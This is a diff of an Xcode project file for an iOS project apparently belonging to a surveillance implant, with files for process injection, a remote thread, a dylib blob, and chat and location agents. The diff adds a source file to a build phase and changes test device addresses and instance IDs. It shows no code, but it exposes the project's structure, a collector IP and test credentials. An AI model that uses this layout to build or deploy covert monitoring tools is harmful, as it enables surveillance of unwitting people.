@@ -216,6 +216,7 @@
 		C55C53CE14CECA240034B013 /* AVFoundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C55C53CD14CECA240034B013 /* AVFoundation.framework */; };
 		CC04D34B15E2209A00B12C6D /* RCSIGlobals.m in Sources */ = {isa = PBXBuildFile; fileRef = CC04D34A15E2209A00B12C6D /* RCSIGlobals.m */; };
 		CC1B55DF15C035A800EDD3F4 /* RCSIAgentChat.m in Sources */ = {isa = PBXBuildFile; fileRef = CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */; };
+		CC386BF715F1096400E644F6 /* RCSIGlobals.m in Sources */ = {isa = PBXBuildFile; fileRef = CC04D34A15E2209A00B12C6D /* RCSIGlobals.m */; };
 		CCBEFEAC15B6B02C00951F6D /* RCSIAgentPositionSupport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A19BEB4107C9A300060F679 /* RCSIAgentPositionSupport.m */; };
 /* End PBXBuildFile section */
 
@@ -1274,6 +1275,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				CC386BF715F1096400E644F6 /* RCSIGlobals.m in Sources */,
 				5233A623156F7180008D80D0 /* RCSIDylibBlob.m in Sources */,
 				52071405154AEF0500FB341F /* RCSIProcInjection.c in Sources */,
 				52071406154AEF0500FB341F /* RCSIRemoteThread.s in Sources */,
@@ -1463,8 +1465,8 @@
 				OTHER_LDFLAGS = "-weak-lEventKit";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_DEVICE_ADDRESS = 172.20.20.136;
-				RCS_TEST_INSTANCE = RCS_0000000978;
+				RCS_TEST_DEVICE_ADDRESS = 127.0.0.1;
+				RCS_TEST_INSTANCE = RCS_0000001187;
 				RCS_TEST_PASSWD = ios_test;
 				RCS_TEST_SHLIB_DIR = /Users/armored/ios_debug;
 				RCS_TEST_SYNCH = YES;
@@ -1504,8 +1506,8 @@
 				OTHER_LDFLAGS = "-weak-lEventKit";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_DEVICE_ADDRESS = 172.20.20.136;
-				RCS_TEST_INSTANCE = RCS_0000000978;
+				RCS_TEST_DEVICE_ADDRESS = 127.0.0.1;
+				RCS_TEST_INSTANCE = RCS_0000001187;
 				RCS_TEST_PASSWD = ios_test;
 				RCS_TEST_SHLIB_DIR = /Users/armored/ios_debug;
 				RCS_TEST_SYNCH = YES;
@@ -1547,7 +1549,7 @@
 				OTHER_LDFLAGS = "-weak-lEventKit";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_INSTANCE = RCS_0000000978;
+				RCS_TEST_INSTANCE = RCS_0000001187;
 				RCS_TEST_PASSWD = ios_test;
 				RCS_TEST_SYNCH = YES;
 				RCS_TEST_USER = iostest;
@@ -1585,7 +1587,7 @@
 				OTHER_LDFLAGS = "-weak-lEventKit";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_INSTANCE = RCS_0000000978;
+				RCS_TEST_INSTANCE = RCS_0000001187;
 				RCS_TEST_PASSWD = ios_test;
 				RCS_TEST_SYNCH = YES;
 				RCS_TEST_USER = iostest;
